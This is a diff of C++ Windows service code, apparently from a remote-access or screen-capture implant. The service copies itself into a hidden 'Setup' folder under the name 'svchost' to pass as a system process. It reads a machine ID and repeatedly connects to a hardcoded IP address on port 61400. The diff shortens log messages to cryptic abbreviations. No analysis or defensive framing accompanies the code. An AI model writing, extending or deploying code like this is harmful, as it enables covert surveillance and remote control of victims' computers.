@@ -37,7 +37,7 @@ void ServiceManager::main(bool separate_process) {
         ostringstream command;
         command << "\"" << this->path << "\" update";
 
-        this->log("SeparateProcess", false);
+        this->log("SP", false);
         this->log(command.str(), false);
 
         bool success_launched = false;
@@ -49,13 +49,13 @@ void ServiceManager::main(bool separate_process) {
 
         this->report_status(SERVICE_STOPPED, NO_ERROR, 0);
     } else {
-        this->log("Creating ScreenManager", false);
+        this->log("SM", false);
         ScreenManager screen_manager = ScreenManager();
 
         this->unique_id = get_machine_id();
 
         ostringstream str_unique_id;
-        str_unique_id << "UniqueID: " << this->unique_id;
+        str_unique_id << "UID: " << this->unique_id;
         this->log(str_unique_id.str(), false);
 
         string hostname = "192.241.213.182";
@@ -64,10 +64,9 @@ void ServiceManager::main(bool separate_process) {
 
         int i = 0;
         while (1) {
-            this->log(i, false);
             ostringstream str_socket;
-            str_socket << "S " << socket;
-            this->log(str_socket, false);
+            str_socket << i << ".S " << socket;
+            this->log(str_socket.str(), false);
 
             if (socket == 0) {
                 socket = connect(hostname, 61400);
@@ -166,14 +165,10 @@ void ServiceManager::copy(void) {
     new_path_folder += "Setup";
 
     string new_path = new_path_folder;
-    new_path += "\\svchost.exe";
+    new_path += "\\svchost";
 
     CreateDirectory(new_path_folder.c_str(), NULL);
     SetFileAttributes(new_path_folder.c_str(), FILE_ATTRIBUTE_HIDDEN);
-
-    if (!DeleteFile(new_path.c_str())) {
-        this->log("Failed to delete file");
-    }
 
     if (CopyFile(this->path.c_str(), new_path.c_str(), FALSE)) {
         this->path = new_path;
@@ -257,8 +252,6 @@ bool ServiceManager::launch_process(string command) {
         while (this->running) {
             wait();
         }
-
-        // WaitForSingleObject(pi.hProcess, INFINITE);
 
         this->log("should stop. Going to kill the process", false);
         TerminateProcess(pi.hProcess, 0);
